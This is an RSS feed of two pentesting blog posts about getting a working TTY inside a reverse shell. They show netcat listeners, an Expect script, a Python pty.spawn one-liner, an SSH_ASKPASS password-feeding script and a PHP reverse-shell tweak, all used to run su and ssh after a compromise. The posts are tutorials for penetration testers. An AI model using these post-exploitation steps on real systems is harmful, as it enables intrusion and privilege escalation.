<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>tty &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/tty/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 20 Aug 2011 15:56:30 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Post-Exploitation Without A TTY</title>
		<link>https://pentestmonkey.net/blog/post-exploitation-without-a-tty</link>
					<comments>https://pentestmonkey.net/blog/post-exploitation-without-a-tty#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 16 Jan 2008 22:08:59 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[expect]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[tty]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=35</guid>

					<description><![CDATA[This is a follow-up to a topic I touched on breifly before when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.  I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This is a follow-up to a topic I touched on breifly <a href="http://pentestmonkey.net/blog/ssh-with-no-tty/">before</a> when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.  I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get root because I couldn&#8217;t run &#8220;login&#8221; or &#8220;su&#8221;.  Both of these required a TTY in order to work.</p>
<p>I don&#8217;t present a definitive solution in this problem (if you have one please sent it in!).  However I discuss a couple of approaches to getting a TTY&#8230;</p>
<p><span id="more-35"></span></p>
<p>Post-exploitation activities during a pentest may involve using &#8220;su&#8221; to try and log into other local accounts, or using &#8220;ssh&#8221; to log into other hosts.</p>
<h3>Using &#8220;Expect&#8221; To Get A TTY</h3>
<p>If you&#8217;re lucky enough to have the <a href="http://en.wikipedia.org/wiki/Expect">Expect</a> language installed just a few lines of code will get you a good enough TTY to run useful tools such as &#8220;ssh&#8221;, &#8220;su&#8221; and &#8220;login&#8221;.</p>
<pre>$ cat sh.exp
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact</pre>
<p>The following output taken from a <a href="http://pentestmonkey.net/tools/php-reverse-shell/">reverse shell</a> demonstrates how &#8220;su&#8221; doesn&#8217;t work until we use the Expect script:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48257
sh: no job control in this shell
sh-3.2$ su -
su: must be run from a terminal
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ su -
Password:  mypassword
localhost ~ #</pre>
<p>Likewise, the ssh client doesn&#8217;t seem to work properly (with or without the -T option):</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33250
sh: no job control in this shell
sh-3.2$ ssh localhost
Pseudo-terminal will not be allocated because stdin is not a terminal.
&lt;big pause&gt;</pre>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33252
sh: no job control in this shell
sh-3.2$ ssh -T localhost
&lt;big pause&gt;</pre>
<p>After we run sh.exp we are able to use the ssh client as normal:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43498
sh: no job control in this shell
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ ssh localhost
ssh localhost
Password: mypassword
Last login: Wed Jan 16 13:43:20 2008 from 127.0.0.1

user@localhost ~ $</pre>
<h3>Using Python To Get A TTY</h3>
<p>This is quite an elegant solution I found on <a href="http://tero.marttila.de/">Tero&#8217;s glob</a>.  It should be effective against gentoo systems at least because the gentoo package management runs on python.</p>
<p>$ nc -v -n -l -p 1234<br />
listening on [any] 1234 &#8230;<br />
sh: no job control in this shell<br />
sh-3.2$ su &#8211;<br />
su: must be run from a terminal<br />
sh-3.2$ python -c &#8216;import pty; pty.spawn(&#8220;/bin/sh&#8221;)&#8217;<br />
sh-3.2$ su &#8211;<br />
su &#8211;<br />
Password:<br />
localhost ~ #</p>
<h3>Using PERL To Get A TTY</h3>
<p>This is not such as great solution as IO::Pty isn&#8217;t installed by default on any system I&#8217;ve seen.  For completeness, though:</p>
<p>&lt;hmmm&#8230; can&#8217;t get it will working.  Will post later.&gt;</p>
<pre></pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/post-exploitation-without-a-tty/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Using SSH Without A TTY</title>
		<link>https://pentestmonkey.net/blog/ssh-with-no-tty</link>
					<comments>https://pentestmonkey.net/blog/ssh-with-no-tty#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 15 Dec 2007 23:35:29 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[ssh]]></category>
		<category><![CDATA[tty]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=29</guid>

					<description><![CDATA[I recently received a mail asking how to get SSH to work from within a reverse shell (see php-reverse-shell , php-findsock-shell and perl-reverse-shell ).  I thought I&#8217;d write a brief description of the problems I&#8217;ve seen and how to work round them. I&#8217;d be very interested if anyone has any better solutions.  Drop me a [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I recently received a mail asking how to get SSH to work from within a reverse shell (see <a href="http://pentestmonkey.net/tools/php-reverse-shell/">php-reverse-shell</a> , <a href="http://pentestmonkey.net/tools/php-findsock-shell/">php-findsock-shell </a> and <a href="http://pentestmonkey.net/tools/perl-reverse-shell/">perl-reverse-shell</a> ).  I thought I&#8217;d write a brief description of the problems I&#8217;ve seen and how to work round them.</p>
<p>I&#8217;d be very interested if anyone has any better solutions.  Drop me a mail (pentestmonkey at pentestmonkey dot net).</p>
<p>Update: Also see this <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty/">follow-up post</a> on a similar subject.</p>
<p><span id="more-29"></span></p>
<h3>Problem 1: &#8220;Host key verification failed.&#8221;</h3>
<p>When you connect to a host for the first time you normally (when you ave a TTY) get a message like:</p>
<pre>$ ssh localhost</pre>
<pre>The authenticity of host 'localhost (127.0.0.1)' can't be established.</pre>
<pre>RSA key fingerprint is ...</pre>
<pre>Are you sure you want to continue connecting (yes/no)?</pre>
<p>You can answer &#8220;yes&#8221; and the authentication proceeds.</p>
<p>However, if you don&#8217;t have a TTY (like when you&#8217;re using a reverse shell), authentication fails immediately with an error:</p>
<pre>$ ssh localhost</pre>
<pre>Pseudo-terminal will not be allocated because stdin is not a terminal.</pre>
<pre>Host key verification failed.</pre>
<h3>Workaround</h3>
<p>Before attempting an SSH connection for the first time you need to grab the host keys for host you want to connect to and store them in the known_hosts file of the current user:</p>
<pre>ssh-keyscan -t rsa1,rsa,dsa localhost &gt;&gt; ~/.ssh/known_hosts</pre>
<p>Next time you try an SSH connection you won&#8217;t get the &#8220;Host key verification failed&#8221; error.</p>
<h3>Problem 2: Can&#8217;t enter SSH password</h3>
<p>If you don&#8217;t have a TTY (you typically don&#8217;t when using a reverse shell) you won&#8217;t be asked for a password, authentication will just fail:</p>
<pre>sh-3.2$ ssh localhost</pre>
<pre>Pseudo-terminal will not be allocated because stdin is not a terminal.</pre>
<pre>Permission denied (publickey,keyboard-interactive).</pre>
<h3>Workaround</h3>
<p>You can use an external program to provide the password you want to use. Check out:</p>
<ul>
<li><a class="moz-txt-link-freetext" href="http://www.splode.com/%7Efriedman/software/scripts/src/ssh-pass">http://www.splode.com/~friedman/software/scripts/src/ssh-pass</a></li>
<li>man ssh (search for &#8220;SSH_ASKPASS&#8221;)</li>
</ul>
<pre>$ cat /tmp/returnpassword.sh
#!/bin/sh
echo 'some password' &lt;/dev/null
$ export DISPLAY=:0
$ export SSH_ASKPASS=/tmp/returnpassword.sh
$ ssh user@host
id
uid=1000(user) gid=1000(user)
bash -i
user@host $</pre>
<h3>Other potential solutions</h3>
<p>Modify your php-reverse-shell (or whatever) to use PTYs if the PHP installation supports them.  Of course your php code will also need to handle the case when PTYs aren&#8217;t supported.  PHP 5 can support PTYs, but it needs to be compiled with the right options (&#8211;enable-pty).  The code modification should be simple:</p>
<pre>$descriptorspec = array(
   0 =&gt; array("pty"),  // stdin   
   1 =&gt; array("pty"),  // stdout
   2 =&gt; array("pty")   // stderr
);</pre>
<p>The system I tested the above code on gave the following error because PHP5 didn&#8217;t have PTY support enabled:</p>
<pre>Warning: proc_open() [function.proc-open]: pty pseudo terminal not supported on this system in ...htdocs/php-reverse-shell.php on line 109</pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/ssh-with-no-tty/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
